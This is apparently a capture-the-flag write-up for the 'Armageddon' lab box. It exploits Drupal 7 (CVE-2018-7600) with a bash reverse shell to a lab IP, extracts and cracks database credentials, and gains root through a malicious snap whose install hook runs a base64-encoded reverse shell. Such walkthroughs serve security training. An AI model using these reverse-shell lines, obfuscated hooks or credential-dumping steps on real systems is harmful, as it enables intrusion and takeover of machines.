# Box: Armageddon

> Damiano Gubiani | 11/12/2025

export box ip

```bash
export IP='10.129.48.89'
```

# Enumerating

running an nmap scan to scan for open ports

```bash
sudo nmap -sS -sC -oN nmap/scan -vv -T4 $IP
```

output

```
# Nmap 7.95 scan initiated Thu Dec 11 08:21:23 2025 as: /usr/lib/nmap/nmap -sS -sC -oN nmap/scan -vv -T4 10.129.48.89
Nmap scan report for 10.129.48.89
Host is up, received echo-reply ttl 63 (0.082s latency).
Scanned at 2025-12-11 08:21:24 EST for 7s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC2xdFP3J4cpINVArODYtbhv+uQNECQHDkzTeWL+4aLgKcJuIoA8dQdVuP2UaLUJ0XtbyuabPEBzJl3IHg3vztFZ8UEcS94KuWP09ghv6fhc7JbFYONVJTYLiEPD8nrS/V2EPEQJ2ubNXcZAR76X9SZqt11JTyQH/s6tPH+m3m/84NUU8PNb/dyhrFpCUmZzzJQ1zCDStLXJnCAOE7EfW2wNm1CBPCXn1wNvO3SKwokCm4GoMKHSM9rNb9FjGLIY0nq+8mt7RTJZ+WLdHsje3AkBk1yooGFF+0TdOj42YK2OtAKDQBWnBm1nqLQsmm/Va9T2bPYLLK5aUd4/578u7h
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE4kP4gQ5Th3eu3vz/kPWwlUCm+6BSM6M3Y43IuYVo3ppmJG+wKiabo/gVYLOwzG7js497Vr7eGIgsjUtbIGUrY=
|   256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG9ZlC3EA13xZbzvvdjZRWhnu9clFOUe7irG8kT0oR4A
80/tcp open  http    syn-ack ttl 63
|_http-title: Welcome to  Armageddon |  Armageddon
| http-robots.txt: 36 disallowed entries 
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D

Read data files from: /usr/share/nmap
# Nmap done at Thu Dec 11 08:21:31 2025 -- 1 IP address (1 host up) scanned in 7.68 seconds

```

we alredy know the webapp is running drupal version 7 lets check online for public exploit


# Exploit

i found this PoC on github 

> https://github.com/pimps/CVE-2018-7600

and after trying on the webapp we got RCE on the machine

lets get a reverse shell with this exploit

starting a listener

```bash
rlwrap nc -lvvnp 4444
```

and then i run the script again

```bash
python3 drupa7-CVE-2018-7600.py -c 'bash -c "/bin/bash -i >& /dev/tcp/10.10.14.149/4444 0>&1"' http://10.129.12.79/
```

we got a callback

![](screen/Pasted%20image%2020251212172442.png)

lets enumerate the webapp for potential stored credentials or plain text credentials

while checking around i found a settings.php file with stored credentials for the database of drupal

![](screen/Pasted%20image%2020251212172924.png)

lets run some mysql query to get to enumerate the database for potential password hash

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
```

![](screen/Pasted%20image%2020251212173041.png)

lets check the drupal database

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal;show tables;'
```

![](screen/Pasted%20image%2020251212173223.png)

theres a user table lets extract its content

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal;select * from users;'
```

![](screen/Pasted%20image%2020251212173330.png)

we got a password hash for the user brucetherealadmin , lets crack it with hashcat

first we need to know the mode for drupal hashes

```bash
hashcat -hh | grep Drupal
```

![](screen/Pasted%20image%2020251212173508.png)

lets run a bruteforce attack

```bash
hashcat -m 7900 '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' /usr/share/wordlists/rockyou.txt
```

we found the password for the user

> brucetherealadmin : booboo

# PrivEsc

i used this credentials for the SSH connection , and after connecting to it we run standard enumeration.

checking sudo permission we found this

```
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

checking GTFOs exploit we found this

link:

>https://gtfobins.github.io/gtfobins/

![](screen/Pasted%20image%2020251212174002.png)

i made a script to automate this so:

on the attacker machine we run this

```bash
#! /bin/bash

COMMAND='echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE0OS80NDQ0IDA+JjE= | base64 -d | bash'
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n exploit -s dir -t snap -a all meta
```

the base64 code is just a standard reverse shell encoded and than decoded and run on the victim machine

```bash
/bin/bash -i >& /dev/tcp/10.10.14.149/4444 0>&1
```

than we upload it on the victim

```bash
# attacker machine
python3 -m http.server 80

# victim machine
curl -O http://10.10.14.149/exploit_1.0_all.snap
```

than we run a listener on our machine 

```bash
rlwrap nc -lvvnp 4444
```

finaly we run the exploit on the target machine

```bash
sudo snap install exploit_1.0_all.snap --dangerous --devmode
```

and we got a root shell

![](screen/Pasted%20image%2020251212175615.png)